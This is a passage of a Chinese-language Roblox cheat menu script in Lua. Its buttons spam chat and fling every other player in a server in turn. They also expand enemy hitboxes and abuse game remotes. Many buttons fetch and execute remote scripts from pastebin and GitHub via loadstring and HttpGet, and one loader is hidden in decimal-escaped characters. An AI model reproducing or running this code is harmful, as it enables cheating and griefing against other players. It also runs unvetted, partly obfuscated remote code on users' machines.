    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/me ", "All")
end
wait(0.75)
amount_of_msgs = 1
for i          = 1, amount_of_msgs do
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/me ", "All")
end
wait(0.75)
amount_of_msgs = 1
for i          = 1, amount_of_msgs do
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/me ", "All")
end
wait(0.75)
amount_of_msgs = 1
for i          = 1, amount_of_msgs do
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/me ", "All")
end
wait(0.75)
amount_of_msgs = 1
for i          = 1, amount_of_msgs do
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/me ", "All")
end
wait(12)
end

  	end    

})

Tab:AddButton({

	Name = "r15变r6",

	Callback = function()

     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))()

  	end    

})

Tab:AddButton({

	Name = "圆圈护盾（伪无敌）",

	Callback = function()

     Instance.new("ForceField", game.Players.LocalPlayer.Character)

  	end    

})

Tab:AddButton({

	Name = "动作失落",

	Callback = function()

     --Shit ass script made by failedmite57926

local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local Humanoid = Character:FindFirstChildOfClass("Humanoid")

function rm()
	for i,v in pairs(Character:GetDescendants()) do
		if v:IsA("BasePart") then
			if v.Name == "Handle" or v.Name == "Head" then
				if Character.Head:FindFirstChild("OriginalSize") then
					Character.Head.OriginalSize:Destroy()
				end
			else
				for i,cav in pairs(v:GetDescendants()) do
					if cav:IsA("Attachment") then
						if cav:FindFirstChild("OriginalPosition") then
							cav.OriginalPosition:Destroy()  
						end
					end
				end
				v:FindFirstChild("OriginalSize"):Destroy()
				if v:FindFirstChild("AvatarPartScaleType") then
					v:FindFirstChild("AvatarPartScaleType"):Destroy()
				end
			end
		end
	end
end

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("HeadScale"):Destroy()
wait(1)

  	end    

})

Tab:AddButton({

	Name = "无限连跳",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()

  	end    

})

Tab:AddButton({

	Name = "移除头发",

	Callback = function()

     assets = {540034631, 178993946, 461493477, 110288809}
me = game:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'
for i,v in pairs(me.Parent:GetChildren()) do
if v:IsA'Accoutrement' then v.Parent = nil end
end
for i,v in pairs(assets) do
  game:GetService'ReplicatedStorage'.ITEM_PURCHASE:InvokeServer('xdd', tostring(game:GetService'MarketplaceService':GetProductInfo(v).AssetTypeId), v)
end
me.WalkSpeed = 50 --same
mouse = game:GetService'Players'.LocalPlayer:GetMouse()
exploded = false
boom = mouse.Button1Down:connect(function()
if exploded == true then return end
exploded = true
game:GetService'ReplicatedStorage'.ITEM_PURCHASE:InvokeServer('boom', '8', '1527622')
print'exploding!!!'
exploded = true
boom:Disconnect()
end)

  	end    

})

Tab:AddButton({

	Name = "防空警报",

	Callback = function()

     local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://792323017"
    sound.Parent = game.Workspace
    sound:Play()

  	end    

})

Tab:AddButton({

	Name = "FE动作",

	Callback = function()

     loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()

  	end    

})

Tab:AddButton({

	Name = "显示帧率",

	Callback = function()

      -- Gui to Lua 
 -- Version: 3.2 
  
 -- Instances:
 local ScreenGui = Instance.new("ScreenGui") 
 local FpsLabel = Instance.new("TextLabel")
 
 --Properties:
 
 ScreenGui.Name = "FPSGui" 
 ScreenGui.ResetOnSpawn = false 
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
 
 FpsLabel.Name = "FPSLabel" 
 FpsLabel.Size = UDim2.new(0, 100, 0, 50) 
 FpsLabel.Position = UDim2.new(0, 10, 0, 10) 
 FpsLabel.BackgroundTransparency = 1 
 FpsLabel.Font = Enum.Font.SourceSansBold 
 FpsLabel.Text = "帧率: 0" 
 FpsLabel.TextSize = 20 
 FpsLabel.TextColor3 = Color3.new(1, 1, 1) 
 FpsLabel.Parent = ScreenGui 
  
 function updateFpsLabel() 
     local fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait()) 
     FpsLabel.Text = "帧率: " .. fps 
 end 
  
  game:GetService("RunService").RenderStepped:Connect(updateFpsLabel) 
  
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")


 animateCredits()

  	end    

})

Tab:AddButton({

	Name = "旋转甩飞",

	Callback = function()

     game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "旋转甩飞"; Text ="汉化鹤"; Duration = 4; })
game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "旋转甩飞"; Text ="原作者: topit "; Duration = 4; })

local PlayerService = game:GetService("Players")--:GetPlayers()
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local plr = PlayerService.LocalPlayer
local mouse = plr:GetMouse()
local BodyThrust = nil
local Dragging = {}

local Suggestions = {
    2298830673, 300, 365, --gamier (test game)
    1537690962, 250, 350, --bee swarm sim
    5580097107, 300, 400, --frappe
    2202352383, 275, 350, --super power training sim
    142823291, 350, 425,  --murder mystery 2
    155615604, 273, 462,  --prison life
    1990228024, 200, 235, --bloxton hotels
    189707, 250, 325,     --natural disaster survival
    230362888, 265, 415,  --the normal elevator       (may not work)
    5293755937, 335, 435, --speedrun sim
    537413528, 300, 350,  --build a boat              (may not work)
    18540115, 300, 425,   --survive the disasters
    2041312716, 350, 465  --Ragdoll engine
}


local version = ""
local font = Enum.Font.FredokaOne

local AxisPositionX = {
	0.05, 
	0.35,
	0.65
}

local AxisPositionY = {
	40, --edit fling speed
	90, --toggle fling types (normal, qfling, serverkek)
	140, --extra (respawn)
	190, --edit gui settings (hotkey, theme)
	240
}

local Fling = {
	false, --toggle
	"", --hotkey
	300, --speed
	false, --server
	false --stop vertfling
}


--[[themes:]]--

local Theme_JeffStandard = {
	Color3.fromRGB(15, 25, 35),   
	Color3.fromRGB(10, 20, 30),   
	Color3.fromRGB(27, 42, 53),   
	Color3.fromRGB(25, 35, 45),   
	Color3.fromRGB(20, 30, 40),   
	Color3.fromRGB(25, 65, 45),   
	Color3.fromRGB(255, 255, 255),
	Color3.fromRGB(245, 245, 255),
	Color3.fromRGB(155, 155, 255) 
}
local Theme_Dark = {
	Color3.fromRGB(25, 25, 25),   --Top bar
	Color3.fromRGB(10, 10, 10),   --Background
	Color3.fromRGB(40, 40, 40),   --Border color
	Color3.fromRGB(35, 35, 35),   --Button background
	Color3.fromRGB(20, 20, 20),   --Unused
	Color3.fromRGB(25, 100, 45),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Steel = {
	Color3.fromRGB(25, 25, 35),   --Top bar
	Color3.fromRGB(10, 10, 20),   --Background
	Color3.fromRGB(40, 40, 50),   --Border color
	Color3.fromRGB(35, 35, 45),   --Button background
	Color3.fromRGB(20, 20, 25),   --Unused
	Color3.fromRGB(25, 100, 55),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Rust = {
	Color3.fromRGB(45, 25, 25),   
	Color3.fromRGB(30, 10, 10),   
	Color3.fromRGB(60, 40, 40),   
	Color3.fromRGB(55, 35, 35),   
	Color3.fromRGB(40, 20, 20),   
	Color3.fromRGB(45, 100, 45),  
	Color3.fromRGB(255, 255, 255),
	Color3.fromRGB(255, 245, 255),
	Color3.fromRGB(175, 155, 255) 
}
local Theme_Violet = {
	Color3.fromRGB(35, 25, 45),   --Top bar
	Color3.fromRGB(20, 10, 30),   --Background
	Color3.fromRGB(50, 40, 60),   --Border color
	Color3.fromRGB(45, 35, 55),   --Button background
	Color3.fromRGB(30, 20, 40),   --Unused
	Color3.fromRGB(35, 100, 65),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Space = {
	Color3.fromRGB(10, 10, 10),   --Top bar
	Color3.fromRGB(0, 0, 0),   --Background
	Color3.fromRGB(20, 20, 20),   --Border color
	Color3.fromRGB(15, 15, 15),   --Button background
	Color3.fromRGB(5, 5, 5),   --Unused
	Color3.fromRGB(20, 25, 50),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_SynX = {
	Color3.fromRGB(75, 75, 75),   --Top bar
	Color3.fromRGB(45, 45, 45),   --Background
	Color3.fromRGB(45, 45, 45),   --Border color
	Color3.fromRGB(75, 75, 75),   --Button background
	Color3.fromRGB(0, 0, 5),   --Unused
	Color3.fromRGB(150, 75, 20),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}


local SelectedTheme = math.random(1,6)
if SelectedTheme == 1 then
    SelectedTheme = Theme_Steel
elseif SelectedTheme == 2 then
    SelectedTheme = Theme_Dark
elseif SelectedTheme == 3 then
    SelectedTheme = Theme_Rust
elseif SelectedTheme == 4 then
    SelectedTheme = Theme_Violet
elseif SelectedTheme == 5 then
    SelectedTheme = Theme_Space
elseif SelectedTheme == 6 then
    if syn then
        SelectedTheme = Theme_SynX
    else
        SelectedTheme = Theme_JeffStandard
    end
end

--[[instances:]]--
local ScreenGui = Instance.new("ScreenGui")
local TitleBar = Instance.new("Frame")
local Shadow = Instance.new("Frame")
local Menu = Instance.new("ScrollingFrame")

local TitleText = Instance.new("TextLabel")
local TitleTextShadow = Instance.new("TextLabel")
local CreditText = Instance.new("TextLabel")
local SuggestionText = Instance.new("TextLabel")

local SpeedBox = Instance.new("TextBox")
local Hotkey = Instance.new("TextBox")

local SpeedUp = Instance.new("TextButton")
local SpeedDown = Instance.new("TextButton")
local ToggleFling = Instance.new("TextButton")
local ToggleServerKill = Instance.new("TextButton")
local NoVertGain = Instance.new("TextButton")
local Respawn = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")

--local BodyThrust = Instance.new("BodyThrust")

ScreenGui.Name = "JeffFling"
ScreenGui.Parent = game.CoreGui
ScreenGui.Enabled = true

TitleBar.Name = "Title Bar"
TitleBar.Parent = ScreenGui
TitleBar.BackgroundColor3 = SelectedTheme[1]
TitleBar.BorderColor3 = SelectedTheme[3]
TitleBar.Position = UDim2.new(-0.3, 0, 0.7, 0)
TitleBar.Size = UDim2.new(0, 400, 0, 250)
TitleBar.Draggable = true
TitleBar.Active = true
TitleBar.Selectable = true
TitleBar.ZIndex = 100

Shadow.Name = "Shadow"
Shadow.Parent = TitleBar
Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Shadow.BackgroundTransparency = 0.5
Shadow.BorderSizePixel = 0
Shadow.Position = UDim2.new(0, 5, 0, 5)
Shadow.Size = TitleBar.Size
Shadow.ZIndex = 50

Menu.Name = "Menu"
Menu.Parent = TitleBar
Menu.BackgroundColor3 = SelectedTheme[2]
Menu.BorderColor3 = SelectedTheme[3]
Menu.AnchorPoint = Vector2.new(0,0)
Menu.Position = UDim2.new(0, 0, 0, 50)
Menu.Size = UDim2.new(0, 400, 0, 200)
Menu.CanvasSize = UDim2.new(0, TitleBar.Size.X, 0, 325)
Menu.ScrollBarImageTransparency = 0.5
Menu.ZIndex = 200

TitleText.Name = "Title Text"
TitleText.Parent = TitleBar
TitleText.AnchorPoint = Vector2.new(0, 0)
TitleText.Position = UDim2.new(0, 100, 0, 25)
TitleText.Font = font
TitleText.Text = "旋转甩飞脚本【汉化作者：鹤】"..version
TitleText.TextColor3 = SelectedTheme[8]
TitleText.TextSize = 28
TitleText.ZIndex = 300
TitleText.BackgroundTransparency = 1

TitleTextShadow.Name = "Shadow"
TitleTextShadow.Parent = TitleText
TitleTextShadow.Font = font
TitleTextShadow.Text = "甩飞"..version
TitleTextShadow.TextSize = 28
TitleTextShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleTextShadow.TextTransparency = 0.5
TitleTextShadow.Position = UDim2.new(0, 5, 0, 5)
TitleTextShadow.ZIndex = 250
TitleTextShadow.BackgroundTransparency = 1

SuggestionText.Name = "Suggestion Text"
SuggestionText.Parent = Menu
SuggestionText.Position = UDim2.new(0, 20, 0, 250)
SuggestionText.Font = font
SuggestionText.Text = "e"
SuggestionText.TextColor3 = SelectedTheme[7]
SuggestionText.TextSize = 24
SuggestionText.TextXAlignment = Enum.TextXAlignment.Left
SuggestionText.ZIndex = 300
SuggestionText.BackgroundTransparency = 1

CreditText.Name = "Credit Text"
CreditText.Parent = Menu
CreditText.Position = UDim2.new(0, 20, 0, 300)
CreditText.Font = font
CreditText.Text = "原作者: topit 汉化:鹤 "
CreditText.TextColor3 = SelectedTheme[7]
CreditText.TextSize = 20
CreditText.TextXAlignment = Enum.TextXAlignment.Left
CreditText.ZIndex = 300
CreditText.BackgroundTransparency = 1

SpeedBox.Name = "速度"
SpeedBox.Parent = Menu
SpeedBox.BackgroundColor3 = SelectedTheme[4]
SpeedBox.BorderColor3 = SelectedTheme[3]
SpeedBox.TextColor3 = SelectedTheme[7]
SpeedBox.Position = UDim2.new(AxisPositionX[1], 0, 0, AxisPositionY[1])
SpeedBox.Size = UDim2.new(0, 100, 0, 25)
SpeedBox.Font = Enum.Font.FredokaOne
SpeedBox.Text = "现在的速度: "..Fling[3]
SpeedBox.PlaceholderText = "甩飞速度"
SpeedBox.TextScaled = true
SpeedBox.ZIndex = 300

Hotkey.Name = "Custom Hotkey"
Hotkey.Parent = Menu
Hotkey.BackgroundColor3 = SelectedTheme[4]
Hotkey.BorderColor3 = SelectedTheme[3]
Hotkey.TextColor3 = SelectedTheme[7]
Hotkey.Position = UDim2.new(AxisPositionX[2], 0, 0, AxisPositionY[3])
Hotkey.Size = UDim2.new(0, 100, 0, 25)
Hotkey.Font = Enum.Font.FredokaOne
Hotkey.Text = "推荐5"
Hotkey.PlaceholderText = "数值:"
Hotkey.TextScaled = true
Hotkey.ZIndex = 300

SpeedUp.Name = "Speed Up"
SpeedUp.Parent = Menu
SpeedUp.BackgroundColor3 = SelectedTheme[4]
SpeedUp.BorderColor3 = SelectedTheme[3]
SpeedUp.TextColor3 = SelectedTheme[7]
SpeedUp.Position = UDim2.new((AxisPositionX[2]), 0, 0, (AxisPositionY[1]))
SpeedUp.Size = UDim2.new(0, 100, 0, 25)
SpeedUp.Font = Enum.Font.FredokaOne
SpeedUp.Text = "增加"
SpeedUp.TextScaled = true
SpeedUp.ZIndex = 300

SpeedDown.Name = "Speed Down"
SpeedDown.Parent = Menu
SpeedDown.BackgroundColor3 = SelectedTheme[4]
SpeedDown.BorderColor3 = SelectedTheme[3]
SpeedDown.TextColor3 = SelectedTheme[7]
SpeedDown.Position = UDim2.new((AxisPositionX[3]), 0, 0, (AxisPositionY[1]))
SpeedDown.Size = UDim2.new(0, 100, 0, 25)
SpeedDown.Font = Enum.Font.FredokaOne
SpeedDown.Text = "减少"
SpeedDown.TextScaled = true
SpeedDown.ZIndex = 300

ToggleFling.Name = "Fling toggle"
ToggleFling.Parent = Menu
ToggleFling.BackgroundColor3 = SelectedTheme[4]
ToggleFling.BorderColor3 = SelectedTheme[3]
ToggleFling.TextColor3 = SelectedTheme[7]
ToggleFling.Position = UDim2.new((AxisPositionX[1]), 0, 0, (AxisPositionY[2]))
ToggleFling.Size = UDim2.new(0, 100, 0, 25)
ToggleFling.Font = Enum.Font.FredokaOne
ToggleFling.Text = "点击旋转"
ToggleFling.TextScaled = true
ToggleFling.ZIndex = 300

Respawn.Name = "Respawn"
Respawn.Parent = Menu
Respawn.BackgroundColor3 = SelectedTheme[4]
Respawn.BorderColor3 = SelectedTheme[3]
Respawn.TextColor3 = SelectedTheme[7]
Respawn.Position = UDim2.new((AxisPositionX[1]), 0, 0, (AxisPositionY[3]))
Respawn.Size = UDim2.new(0, 100, 0, 25)
Respawn.Font = Enum.Font.FredokaOne
Respawn.Text = "关闭旋转"
Respawn.TextScaled = true
Respawn.ZIndex = 300

NoVertGain.Name = "NoVertGain"
NoVertGain.Parent = Menu
NoVertGain.BackgroundColor3 = SelectedTheme[4]
NoVertGain.BorderColor3 = SelectedTheme[3]
NoVertGain.TextColor3 = SelectedTheme[7]
NoVertGain.Position = UDim2.new((AxisPositionX[2]), 0, 0, (AxisPositionY[2]))
NoVertGain.Size = UDim2.new(0, 100, 0, 25)
NoVertGain.Font = Enum.Font.FredokaOne
NoVertGain.Text = "推荐"
NoVertGain.TextScaled = true
NoVertGain.ZIndex = 300

ToggleServerKill.Name = ""
ToggleServerKill.Parent = Menu
ToggleServerKill.BackgroundColor3 = SelectedTheme[4]
ToggleServerKill.BorderColor3 = SelectedTheme[3]
ToggleServerKill.TextColor3 = SelectedTheme[7]
ToggleServerKill.Position = UDim2.new((AxisPositionX[3]), 0, 0, (AxisPositionY[2]))
ToggleServerKill.Size = UDim2.new(0, 100, 0, 25)
ToggleServerKill.Font = Enum.Font.FredokaOne
ToggleServerKill.Text = "甩飞"
ToggleServerKill.TextScaled = true
ToggleServerKill.ZIndex = 300

CloseButton.Name = "Close Button"
CloseButton.AnchorPoint = Vector2.new(1, 0)
CloseButton.Parent = TitleBar
CloseButton.BackgroundColor3 = SelectedTheme[4]
CloseButton.BorderColor3 = SelectedTheme[3]
CloseButton.TextColor3 = SelectedTheme[7]
CloseButton.Position = UDim2.new(1, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 25, 0, 25)
CloseButton.Font = Enum.Font.FredokaOne
CloseButton.Text = "关闭"
CloseButton.ZIndex = 300
CloseButton.TextSize = 14

--BodyThrust.Name = "Power"
--BodyThrust.Parent = plr.Character.Torso
--BodyThrust.Force = Vector3.new(0, 0, 0)
--BodyThrust.Location = Vector3.new(0, 0, 0)

--[[functions:]]--
local function DisplayText(title, text, duration)
	duration = duration or 1
	game.StarterGui:SetCore("SendNotification", 
		{
			Title = title;
			Text = text;
			Icon = "";
			Duration = duration;
		}
	)
end

local function DisplaySuggestion()
    for i,v in pairs(Suggestions) do
        if v >= 9999 and v == game.PlaceId then
            DisplayText("推荐速度调250-325","推荐速度调: "..Suggestions[i+1].." - "..Suggestions[i+2])
            SuggestionText.Text = "推荐速度调: "..Suggestions[i+1].." - "..Suggestions[i+2]
        end
    end
    if SuggestionText.Text == "e" then
        SuggestionText.Text = "No suggestion for this game"
    end
end


local function GetRigType()
    
    if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        return Enum.HumanoidRigType.R15
    elseif plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
        return Enum.HumanoidRigType.R6
    else
        return nil
    end
end

local function GetDeadState(player)
    if player.Character.Humanoid:GetState() == Enum.HumanoidStateType.Dead then
        return true
    else
        return false
    end
end


local function EnableNoClip()
    
    if GetDeadState(plr) == false then
        if GetRigType() == Enum.HumanoidRigType.R6 then
            plr.Character:FindFirstChild("Torso").CanCollide            = false
            plr.Character:FindFirstChild("Head").CanCollide             = false
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = false
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            plr.Character:FindFirstChild("UpperTorso").CanCollide       = false
            plr.Character:FindFirstChild("LowerTorso").CanCollide       = false
            plr.Character:FindFirstChild("Head").CanCollide             = false
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = false
        end
    end
end

local function DisableNoClip()
    
    if GetDeadState(plr) == false then
        if GetRigType() == Enum.HumanoidRigType.R6 then
            plr.Character:FindFirstChild("Torso").CanCollide            = true
            plr.Character:FindFirstChild("Head").CanCollide             = true
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = true
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            plr.Character:FindFirstChild("UpperTorso").CanCollide       = true
            plr.Character:FindFirstChild("LowerTorso").CanCollide       = true
            plr.Character:FindFirstChild("Head").CanCollide             = true
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = true
        end
    end
end

local function OpenObject(object)
    local OpenAnim = TweenService:Create(
    	object,
    	TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), --Enum.EasingStyle.Linear, Enum.EasingDirection.In
    	{Size = UDim2.new(0, 110, 0, 35), BackgroundColor3 = SelectedTheme[6] }
    )
    
    OpenAnim:Play()
end

local function CloseObject(object)
    local CloseAnim = TweenService:Create(
    	object,
    	TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
    	{Size = UDim2.new(0, 100, 0, 25), BackgroundColor3 = SelectedTheme[4] }
    )
    
    CloseAnim:Play()
end

    
local function TToggleFling()
    Fling[1] = not Fling[1]
    if Fling[1] then
        OpenObject(ToggleFling)
        
        BodyThrust = Instance.new("BodyThrust")
        if GetRigType() == Enum.HumanoidRigType.R6 then
            BodyThrust.Parent = plr.Character.Torso
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            BodyThrust.Parent = plr.Character.UpperTorso
        end
        
        EnableNoClip()
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
        
        
        print("Enabled fling")
    else
        CloseObject(ToggleFling)
        
        DisableNoClip()
        for i, v in pairs(plr.Character:GetDescendants()) do
            if v:IsA("BasePart") then
            v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
            end
        end
        BodyThrust:Destroy()
        
        print("Disabled fling")
        
    end
end

local function GetIfPlayerInGame(PlayerToFind)
    if PlayerService:FindFirstChild(PlayerToFind) then
        return true
    else
        return false
    end
end

local function ServerKek()
    local TargetList = {}
    local index = 1
    local playercount = 0
    
    if Fling[1] == true then
        TToggleFling()
    end
    
    for i,v in pairs(PlayerService:GetPlayers()) do
        if v ~= plr then
            playercount = playercount + 1
            table.insert(TargetList, v)
        end
    end
    
    for i,v in pairs(TargetList) do
       print(i,v.Name) 
    end
    
    
    while Fling[4] do
        if index > playercount then
            CloseObject(ToggleServerKill)
            DisplayText("全部甩飞成功","汉化鹤")
            Fling[4] = false
            break
        else
            local InGame = GetIfPlayerInGame(TargetList[index].Name)
            local Dead = GetDeadState(TargetList[index])
            if InGame == true and Dead == false then
                plr.Character.HumanoidRootPart.CFrame = TargetList[index].Character.HumanoidRootPart.CFrame --tp to them
                
                TToggleFling() --enable fling
                
                for i = 0,2,1 do
                    plr.Character.HumanoidRootPart.CFrame = TargetList[index].Character.HumanoidRootPart.CFrame
                    wait(0.15)
                end
                
                TToggleFling() --disable fling
                
                wait(0.1) --wait until disabled
                
                if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then --check if seated
                    plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running) --get out if you are
                end
                
                index = index + 1 --go to next victim
                
                if Fling[4] == false then
                    break
                end
            else
                index = index + 1
            end
        end
    end
end

--[[events:]]--
CloseButton.MouseButton1Down:Connect(function()
    TitleBar:TweenPosition(UDim2.new(-0.3, 0, 0.7, 0), Enum.EasingDirection.In, Enum.EasingStyle.Back, 0.75)
	DisplayText("旋转甩飞关闭","汉化作者鹤")
	wait(0.8)
	ScreenGui.Enabled = false
	ScreenGui:Destroy()
	script:Destroy()
end)

SpeedUp.MouseButton1Down:Connect(function()
    Fling[3] = Fling[3] + 50
    SpeedBox.Text = "速度: "..Fling[3]
    
    if Fling[1] then
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
    end
end)

SpeedDown.MouseButton1Down:Connect(function()
    Fling[3] = Fling[3] - 50
    SpeedBox.Text = "速度: "..Fling[3]
    
    if Fling[1] then
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
    end
end)

SpeedBox.FocusLost:Connect(function()
    Fling[3] = SpeedBox.Text:gsub("%D",""):sub(0,5)
    if Fling[3] ~= nil then
        SpeedBox.Text = "速度: "..Fling[3]
        if Fling[1] then
            BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
            BodyThrust.Location = Vector3.new(0, 0, Fling[3])
        end
    end
    
end)

Hotkey.FocusLost:Connect(function()
    Fling[2] = Hotkey.Text:split(" ")[1]:sub(1,1)
    if Fling[2] ~= nil then
        Hotkey.Text = "数值: "..Fling[2]
    end
end)


ToggleFling.MouseButton1Down:Connect(function()
    TToggleFling()
end)

Respawn.MouseButton1Down:Connect(function()
        
    if Fling[1] then --disable fling if its enabled
        TToggleFling()
    end
    
    wait(0.4) --wait for fling to stop
    
    for i=0,10,1 do
        plr.Character.Humanoid:ChangeState(2) --make player recover from falling
    end
    
    for i, v in pairs(plr.Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
        end
    end
end)

ToggleServerKill.MouseButton1Down:Connect(function()
    Fling[4] = not Fling[4]
    if Fling[4] then
        OpenObject(ToggleServerKill)
        DisplayText("开启全部甩飞","开启成功")
        ServerKek()
    else
        CloseObject(ToggleServerKill)
        DisplayText("关闭全部甩飞","全部甩飞已关闭")
    end
    
end)

NoVertGain.MouseButton1Down:Connect(function()
    Fling[5] = not Fling[5]
    if Fling[5] then
        OpenObject(NoVertGain)
    else
        CloseObject(NoVertGain)
    end
end)

RunService.Stepped:Connect(function()
    if Fling[1] then
        EnableNoClip()
    elseif Fling[5] then
        for i, v in pairs(plr.Character:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
            end
        end
    end
end)

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging[1] = true
        Dragging[2] = input.Position
        Dragging[3] = TitleBar.Position
    end
end)

TitleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging[1] = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        if Dragging[1] then
            local delta = input.Position - Dragging[2]
            TitleBar:TweenPosition(UDim2.new(Dragging[3].X.Scale, Dragging[3].X.Offset + delta.X, Dragging[3].Y.Scale, Dragging[3].Y.Offset + delta.Y), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 0.035)
            wait()
        end
    end
end)

mouse.KeyDown:Connect(function(key)
    if key == Fling[2] then
        TToggleFling()
    end
end)


DisplaySuggestion()
TitleBar:TweenPosition(UDim2.new(0.25, 0, 0.7, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.75)
return nil

  	end    

})

Tab:AddButton({

	Name = "走路甩人",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()

  	end    

})

Tab:AddButton({

	Name = "播放声音",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/music.lua"))()

  	end    

})

Tab:AddButton({

	Name = "NA管理",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()

  	end    

})

Tab:AddButton({

	Name = "脸部放大（敌人）",

	Callback = function()

     _G.HeadSize = 8 
_G.Disabled = true
game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.Head.Transparency = 1
v.Character.Head.BrickColor = BrickColor.new("Red")
v.Character.Head.Material = "Neon"
v.Character.Head.CanCollide = false
v.Character.Head.Massless = true
end)
end
end
end
end)

  	end    

})

Tab:AddButton({

	Name = "循环传送（搭创飞）",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/kXjfpFPh"))()

  	end    

})

Tab:AddButton({

	Name = "最强功能（提供功能）",

	Callback = function()

     loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\110\102\104\107\81\98\80\78\34\41\41\40\41")()

  	end    

})

local Tab = Window:MakeTab({
	Name = "娱乐内存",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({

	Name = "消音手枪",

	Callback = function()

     --[[
    Smith and Wesson M&P 45, chambered in .45 ACP ammunition.
    The standard magazine holds 10 rounds, although magazines that could hold 14 rounds were also made but looked incredibly stupid.
    Credit to litozinnamon for the crosshairs and bullethole decals. I used them without permission. Not like I asked him, anyhow.
]]

plr=game:service'Players'.LocalPlayer
ch,char=plr.Character,plr.Character
hum=ch.Humanoid
